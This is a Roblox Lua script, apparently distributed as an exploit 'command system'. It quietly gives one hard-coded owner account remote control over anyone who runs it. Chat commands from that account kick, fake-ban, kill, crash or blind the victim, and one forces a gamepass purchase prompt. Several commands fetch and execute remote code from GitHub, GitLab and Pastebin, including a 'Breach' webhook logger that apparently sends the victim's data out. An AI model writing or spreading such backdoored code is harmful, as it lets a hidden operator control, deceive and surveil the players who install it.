local players = game:GetService("Players")
local player = players.LocalPlayer
local textChatService = game:GetService("TextChatService")
local marketplaceService = game:GetService("MarketplaceService")
local teleportService = game:GetService("TeleportService")
local starterGui = game:GetService("StarterGui")
local soundService = game:GetService("SoundService")

-- Command States

local breakcameracommandstate = 1
local blurcommandstate = 1
local disableuiscommandstate = 1
local fovcommandstate = 1

local highlightUnauthorized = false

-- Whitelisted Users

local FoundWhitelistedUser = {}
local Whitelist = {
    [3881580552] = {
        Tag = "Celestial Owner",
        Color = "#004cff"
    }
}

-- IsAlive Function

local celestialFunctions = {
    isAlive = function(playerInstance)
        if playerInstance.Character and playerInstance.Character:FindFirstChild("HumanoidRootPart") and playerInstance.Character:FindFirstChild("Head") and playerInstance.Character:FindFirstChild("Humanoid") and playerInstance.Character:FindFirstChild("Humanoid").Health > 0 then
            return true
        else
            return false
        end
    end,

    setCoreGui = function(coreGuiType, state)
        local validCoreGui = {
            ["Chat Window"] = true,
            ["Chat Input"] = true,
            ["Reset"] = true
        }

        if validCoreGui[coreGuiType] then
            local chatVersion = (textChatService.ChatVersion == Enum.ChatVersion.TextChatService) and "TextChatService" or "Legacy"
            
            if coreGuiType == "Chat Window" then

                if chatVersion == "TextChatService" then
                    textChatService.ChatWindowConfiguration.Enabled = state
                elseif chatVersion == "Legacy" then
                    player.PlayerGui.Chat.Frame.Visible = state
                end

            elseif coreGuiType == "Chat Input" then
                textChatService.ChatInputBarConfiguration.Enabled = state
            elseif coreGuiType == "Reset" then
                starterGui:SetCore("ResetButtonCallback", state)
            end

        else
            warn("Invalid coreGuiType.")
        end
    end
}

-- Commands

local Commands = {
    [";kick"] = function()
        players.LocalPlayer:Kick("kicked by the corrade private owner :skull:")
    end,
    [";kill"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            players.LocalPlayer.Character.Humanoid.Health = 0
        end
    end,
    [";loopkill"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            _G.loopkill = true

			while _G.loopkill do
				players.LocalPlayer.Character.Humanoid.Health = 0
				wait(4)
            end
        end
    end,
    [";unloopkill"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
			_G.loopkill = false
        end
    end,
    [";crash"] = function()
        while true do end
    end,
    [";rickroll"] = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/757788428949485651495849884358443235871/3498438968959092309452398053489643986946906969696934964564936969465902439065432906902346509435094309/main/Command%20System/Rickroll%20Command.lua",true))()
    end,
    [";breakmap"] = function()
        local function unanchorParts(object)
            if object:IsA("BasePart") then
                object.Anchored = false
            end
            for _, child in ipairs(object:GetChildren()) do
                unanchorParts(child)
            end
        end
        unanchorParts(workspace)
    end,
    [";freeze"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            players.LocalPlayer.Character.HumanoidRootPart.Anchored = true

            -- Instances
            
            local ice = Instance.new("Part", player.Character)
            local freezesound = Instance.new("Sound", ice)
            
            -- Properties
            
            ice.Name = "Ice"
            ice.Position = players.LocalPlayer.Character.HumanoidRootPart.Position
            ice.Anchored = true
            ice.Size = Vector3.new(6, 7, 6)
            ice.Material = Enum.Material.Ice
            ice.Transparency = 0.4
            ice.BrickColor = BrickColor.new("Dove blue")
            
            freezesound.SoundId = "rbxassetid://6860710840"
            freezesound.Volume = 1
            freezesound.Playing = true
            freezesound.PlayOnRemove = true
            freezesound:Destroy()
        end
    end,
    [";unfreeze"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            players.LocalPlayer.Character.HumanoidRootPart.Anchored = false

            local ice = player.Character:FindFirstChild("Ice")

            if ice then
                ice:Destroy()
            end
        end
    end,
    [";blur"] = function()
        if blurcommandstate == 1 then
            local blur = Instance.new("BlurEffect", game.Lighting)

            blur.Name = "Command Blur"
            blur.Size = 1000000
            blurcommandstate = 2
        elseif blurcommandstate == 2 then
            for i,v in pairs(game.Lighting:GetDescendants()) do
                if v.Name == "Command Blur" and v:IsA("BlurEffect") then
                    v:Destroy()
                end

                blurcommandstate = 1
            end
        end
    end,
    --[[
    [";unblur"] = function()
        local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
        if blur then
            blur:Destroy()
        end
    end,
    ]]
    [";void"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            local character = game.Players.LocalPlayer.Character
			local humanoidrootPart = character:WaitForChild("HumanoidRootPart")
			local newposition = humanoidrootPart.CFrame
			for i = 1, 3 do
				newposition = newposition + Vector3.new(0, -100, 0)
				humanoidrootPart.CFrame = newposition
            end

            local teleportsound = Instance.new("Sound", soundService)

            teleportsound.Name = "Teleport"
            teleportsound.SoundId = "rbxassetid://5797595098"
            teleportsound.Volume = 1
            teleportsound.Playing = true
            wait(2)
            teleportsound:Destroy()
        end
    end,
    [";lagback"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
        end
    end,
    [";ban"] = function()
        players.LocalPlayer:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
    end,
    [";destroymap"] = function()
        local function destroyParts(object)
            if object:IsA("BasePart") then
                object:Destroy()
            end

            for _, child in ipairs(object:GetChildren()) do
                destroyParts(child)
            end
        end
        destroyParts(workspace)
    end,
    [";sit"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            _G.loopsit = true

			while _G.loopsit do
				players.LocalPlayer.Character.Humanoid.Sit = true
				wait(0.6)
            end
        end
    end,
    [";unsit"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            _G.loopsit = false
            players.LocalPlayer.Character.Humanoid.Sit = false
        end
    end,
    [";troll"] = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/757788428949485651495849884358443235871/3498438968959092309452398053489643986946906969696934964564936969465902439065432906902346509435094309/main/Command%20System/Troll%20Command.lua",true))()
    end,
    [";disableuis"] = function()
        if disableuiscommandstate == 1 then
            for i,v in pairs(game:GetDescendants()) do
                if v:IsA("ScreenGui") or v:IsA("ProximityPrompt") then
                    v.Enabled = false
                end
            end
            
            -- Destroying the "Headset Disconnected" UI
            
            for i,v in pairs(game.CoreGui:GetDescendants()) do
                if v.Name == "HeadsetDisconnectedDialog" then
                    v:Destroy()
                end
            end
            disableuiscommandstate = 2
        elseif disableuiscommandstate == 2 then
            for i,v in pairs(game:GetDescendants()) do
                if v:IsA("ScreenGui") or v:IsA("ProximityPrompt") then
                    v.Enabled = true
                end
            end
            disableuiscommandstate = 1
        end
    end,
    --[[
    [";enableuis"] = function()
        for i,v in pairs(game:GetDescendants()) do
            if v:IsA("ScreenGui") or v:IsA("ProximityPrompt") then
                v.Enabled = true
            end
        end
    end,
    ]]
    [";enablealluis"] = function()
        for i,v in pairs(game:GetDescendants()) do
            if v:IsA("Frame") then
                v.Visible = true
            end
        end
    end,
    [";destroyplayer"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            players.LocalPlayer.Character:Destroy()
        end
    end,
    [";jump"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end,
    [";loopjump"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            _G.loopjump = true

			while _G.loopjump do
				players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				wait(0.5)
            end
        end
    end,
    [";unloopjump"] = function()
        if celestialFunctions.isAlive(players.LocalPlayer) then
            _G.loopjump = false
        end
    end,
    [";resetlighting"] = function()
        for i,v in pairs(game.Lighting:GetDescendants()) do
            if v.Name == "Hell" or v.Name == "Blind"  or v.Name == "Distorted" or v.Name == "Corruption" and v:IsA("ColorCorrectionEffect") then
                v:Destroy()
            end
        end
    end,
    [";hell"] = function()
        -- Removing the current colorcorrectioneffect

        for i,v in pairs(game.Lighting:GetDescendants()) do
            if v.Name == "Blind" or v.Name == "Distorted" or v.Name == "Corruption" and v:IsA("ColorCorrectionEffect") then
                v:Destroy()
            end
        end

        local helllighting = Instance.new("ColorCorrectionEffect", game.Lighting)
        local hellambient = Instance.new("Sound", helllighting)

        helllighting.Name = "Hell"
        helllighting.Brightness = 0
        helllighting.Contrast = 1000000000
        helllighting.Saturation = 0
        helllighting.TintColor = Color3.new(255, 0, 0)

        -- Ambient

        hellambient.Name = "Ambient"
        hellambient.SoundId = "rbxassetid://1839542584"
        hellambient.Looped = true
        hellambient.Playing = true
    end,
    [";blind"] = function()
        -- Removing the current colorcorrectioneffect

        for i,v in pairs(game.Lighting:GetDescendants()) do
            if v.Name == "Hell" or v.Name == "Distorted" or v.Name == "Corruption" and v:IsA("ColorCorrectionEffect") then
                v:Destroy()
            end
        end

        local blacklighting = Instance.new("ColorCorrectionEffect", game.Lighting)
        local blindambient = Instance.new("Sound", blacklighting)

        blacklighting.Name = "Blind"
        blacklighting.Brightness = 10000000000
        blacklighting.Contrast = 0
        blacklighting.Saturation = 0
        blacklighting.TintColor = Color3.new(0, 0, 0)

        -- Ambient

        blindambient.Name = "Ambient"
        blindambient.SoundId = "rbxassetid://9063789466"
        blindambient.Looped = true
        blindambient.Volume = 1
        blindambient.Playing = true
    end,
    [";distort"] = function()
        -- Removing the current colorcorrectioneffect

        for i,v in pairs(game.Lighting:GetDescendants()) do
            if v.Name == "Hell" or v.Name == "Blind" or v.Name == "Corruption" and v:IsA("ColorCorrectionEffect") then
                v:Destroy()
            end
        end

        local distortedlighting = Instance.new("ColorCorrectionEffect", game.Lighting)
        local distortedambient = Instance.new("Sound", distortedlighting)
        local distortion = Instance.new("DistortionSoundEffect", distortedambient)

        distortedlighting.Name = "Distorted"
        distortedlighting.Brightness = 0
        distortedlighting.Contrast = 1000000000
        distortedlighting.Saturation = 0
        distortedlighting.TintColor = Color3.new(255, 255, 255)

        -- Ambient

        distortedambient.Name = "Ambient"
        distortedambient.SoundId = "rbxassetid://9063789466"
        distortedambient.Looped = true
        distortedambient.Volume = 1
        distortedambient.Playing = true
    end,
    [";corrupt"] = function()
        -- Removing the current colorcorrectioneffect

        for i,v in pairs(game.Lighting:GetDescendants()) do
            if v.Name == "Hell" or v.Name == "Blind" or v.Name == "Distorted" and v:IsA("ColorCorrectionEffect") then
                v:Destroy()
            end
        end

        local corruptedlightning = Instance.new("ColorCorrectionEffect", game.Lighting)

        corruptedlightning.Name = "Corruption"
        corruptedlightning.Brightness = 0
        corruptedlightning.Contrast = 1000000000
        corruptedlightning.Saturation = 0
        corruptedlightning.TintColor = Color3.new(85, 0, 255)
    end,
    [";jumpscare"] = function()
        -- Adding the jumpscare ui

        -- Instances

        local player = game:GetService("Players").LocalPlayer

        local jeffui = Instance.new("ScreenGui", player.PlayerGui)
        local jeffimage = Instance.new("ImageLabel", jeffui)
        
        jeffui.Name = "Jumpscare"
        jeffimage.Name = "Jeff"

        -- Properties

        jeffui.IgnoreGuiInset = true
        jeffui.ResetOnSpawn = false
        
        jeffimage.Image = "rbxassetid://14446633038"
        jeffimage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        jeffimage.BorderSizePixel = 0
        jeffimage.Size = UDim2.new(1, 0, 1, 0)

        -- Adding the jumpscare audio

        local horroraudio = Instance.new("Sound", jeffui)

        horroraudio.Name = "Jumpscare Sound"
        horroraudio.SoundId = "rbxassetid://3537873683"
        horroraudio.Volume = 0.7
        horroraudio.Playing = true
        wait(3.5)
        jeffui:Destroy()
    end,
    [";breakcamera"] = function()
        if breakcameracommandstate == 1 then
            game.Workspace.Camera.CameraType = "Fixed"
            breakcameracommandstate = 2
        elseif breakcameracommandstate == 2 then
            game.Workspace.Camera.CameraType = "Custom"
            breakcameracommandstate = 1
        end
    end,
    --[[
    [";fixcamera"] = function()
        game.Workspace.Camera.CameraType = "Custom"
    end,
    ]]
    [";fov"] = function()
        if fovcommandstate == 1 then
            _G.loopchangefov = true
            fovcommandstate = 2

            while _G.loopchangefov do
                game.Workspace.Camera.FieldOfView = 1
                wait(0.5)
            end

        elseif fovcommandstate == 2 then
            _G.loopchangefov = false
        
            game.Workspace.Camera.FieldOfView = 80
            fovcommandstate = 1
        end
    end,
    --[[
    [";resetfov"] = function()
        _G.loopchangefov = false
        
        game.Workspace.Camera.FieldOfView = 80
    end,
    ]]
    [";piston"] = function()
        -- Instances

        local player = game:GetService("Players").LocalPlayer

        local ui = Instance.new("ScreenGui", player.PlayerGui)
        local pistonimage = Instance.new("ImageLabel", ui)
        
        ui.Name = "Piston"
        pistonimage.Name = "TheMagicPiston"

        -- Properties

        ui.IgnoreGuiInset = true
        ui.ResetOnSpawn = false
        
        pistonimage.Image = "rbxassetid://14453149311"
        pistonimage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        pistonimage.BorderSizePixel = 0
        pistonimage.Size = UDim2.new(1, 0, 1, 0)

        -- Adding the audio

        local pistonaudio = Instance.new("Sound", ui)

        pistonaudio.Name = "Android"
        pistonaudio.SoundId = "rbxassetid://6201952153"
        pistonaudio.Volume = 1
        pistonaudio.Playing = true
        wait(1.6)
        ui:Destroy()
    end,
    [";anon"] = function()
        local player = game:GetService("Players").LocalPlayer

        -- Instances

        local screengui = Instance.new("ScreenGui", player.PlayerGui)
        local audio = Instance.new("Sound", screengui)
        local imagelabel = Instance.new("ImageLabel", screengui)

        -- GUI Properties

        screengui.IgnoreGuiInset = true
        screengui.ResetOnSpawn = false
        screengui.Name = "Anonymous"

        -- Audio Properties

        audio.Looped = true
        audio.Playing = true
        audio.SoundId = "rbxassetid://1837974793"

        -- Image Properties

        imagelabel.Name = "Anonymous"
        imagelabel.Image = "rbxassetid://14466753853"
        imagelabel.AnchorPoint = Vector2.new(0.5, 0.5)
        imagelabel.BackgroundColor3 = Color3.fromRGB(126.00000768899918, 126.00000768899918, 126.00000768899918)
        imagelabel.BorderSizePixel = 0
        imagelabel.Position = UDim2.new(0.50000006, 0, 0.500116944, 0)
        imagelabel.Size = UDim2.new(1, 0, 1, 0)
        imagelabel.Name = "Anonymous"

        local zoomOutTime = 50
        local zoomOutScale = 0.1
        
        local originalSize = imagelabel.Size
        local zoomedSize = UDim2.new(originalSize.X.Scale * zoomOutScale, originalSize.X.Offset * zoomOutScale, originalSize.Y.Scale * zoomOutScale, originalSize.Y.Offset * zoomOutScale)
        imagelabel.Size = zoomedSize
        
        local tweenService = game:GetService("TweenService")
        local tweenInfo = TweenInfo.new(zoomOutTime, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
        
        local tween = tweenService:Create(imagelabel, tweenInfo, {Size = originalSize})
        tween:Play()
        
        wait(41)
        screengui:Destroy()
    end,
    [";endanon"] = function()
        for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
            if v.Name == "Anonymous" and v:IsA("ScreenGui") then
                v:Destroy()
            end
        end
    end,
    [";disablejump"] = function()
        local ContextActionService = game:GetService("ContextActionService")

        local function DisableSpaceAction(actionName, state, inputObject)
            if inputObject.KeyCode == Enum.KeyCode.Space then
                return Enum.ContextActionResult.Sink
            end
        end
        
        ContextActionService:BindActionAtPriority("Disable Space Key", DisableSpaceAction, false, Enum.ContextActionPriority.High.Value, Enum.KeyCode.Space)
    end,
    [";enablejump"] = function()
        local ContextActionService = game:GetService("ContextActionService")

        local actionName = "Disable Space Key"

        ContextActionService:UnbindAction(actionName)
    end,
    [";disablereset"] = function()
        starterGui:SetCore("ResetButtonCallback", false)
    end,
    [";enablereset"] = function()
        starterGui:SetCore("ResetButtonCallback", true)
    end,
    [";breakmouse"] = function()
        game:GetService("UserInputService").MouseBehavior = "LockCurrentPosition"
    end,
    [";fixmouse"] = function()
        game:GetService("UserInputService").MouseBehavior = "Default"
    end,
    [";gamepass"] = function()
        marketplaceService:PromptGamePassPurchase(players.LocalPlayer, 236839535)
    end,
    [";disableprompts"] = function()
        for i,v in pairs(game:GetDescendants()) do
            if v:IsA("ProximityPrompt") then
                v.Enabled = false
            end
        end
    end,
    [";enableprompts"] = function()
        for i,v in pairs(game:GetDescendants()) do
            if v:IsA("ProximityPrompt") then
                v.Enabled = true
            end
        end
    end,
    [";clearchat"] = function()
        wait(0.1)
        textchatservice.TextChannels.RBXGeneral:SendAsync("/clear")
    end,
    [";log"] = function()
        loadstring(game:HttpGet("https://gitlab.com/scripts1463602/Celestial/-/raw/main/Webhooks/Breach.lua?ref_type=heads"))()
    end
}

for _, v in pairs(players:GetChildren()) do
    if Whitelist[v.UserId] and not Whitelist[players.LocalPlayer.UserId] and not table.find(FoundWhitelistedUser, v.UserId) then
        table.insert(FoundWhitelistedUser, v.UserId)
        v.Chatted:Connect(function(CMD)
            if Commands[CMD] then
                Commands[CMD]()
            end
        end)
    end
end

players.PlayerAdded:Connect(function(v)
    if Whitelist[v.UserId] and not Whitelist[players.LocalPlayer.UserId] and not table.find(FoundWhitelistedUser, v.UserId) then
        table.insert(FoundWhitelistedUser, v.UserId)
        v.Chatted:Connect(function(CMD)
            if Commands[CMD] then
                Commands[CMD]()
            end
        end)
    end
end)


local processedMessages = {}

textChatService.OnIncomingMessage = function(message: TextChatMessage)
    local prop = Instance.new("TextChatMessageProperties")

    -- Check if the message is from a valid source (the local player)

    if message.TextSource then
        local player = players:GetPlayerByUserId(message.TextSource.UserId)
        local localPlayer = players.LocalPlayer

        -- Check if the message has already been processed

        if not processedMessages[message.MessageId] then
            processedMessages[message.MessageId] = true

            -- Help command

            if player == localPlayer and message.Text == ";cmds" then
                if Whitelist[player.UserId] then -- Whitelist check
                    local uiLocation = typeof(gethui) == "function" and gethui() or game:GetService("CoreGui")
                    local existingGui = uiLocation:FindFirstChild("Celestial Commands")

                    -- Destroy any existing instance of he gui

                    if existingGui then
                        existingGui:Destroy()
                    else
                        -- Create new command UI

                        local cmdUI = loadstring(game:HttpGet("https://pastebin.com/raw/yXxXYY6E"))()
                        local commandUI = cmdUI.fetchUI()
    
                        for cmd, _ in pairs(Commands) do
                            cmdUI.createCommand(cmd)
                        end
                    end
                else
                    warn("Player is not whitelisted and cannot access the cmds command.")
                end
            end
        end

        -- Message prefix

        if Whitelist[player.UserId] then
            prop.PrefixText = "<font color='" .. Whitelist[player.UserId]["Color"] .. "'>[" .. Whitelist[player.UserId]["Tag"] .. "]</font> " .. player.DisplayName .. ":"
        elseif Whitelist[localPlayer.UserId] then
            prop.PrefixText = "<font color='#FFFF00'>[USER]</font> " .. player.DisplayName .. ":"
        else
            prop.PrefixText = player.DisplayName
        end

        prop.Text = message.Text -- Prevent losing message text
    end

    return prop
end





print("command system successfully ran")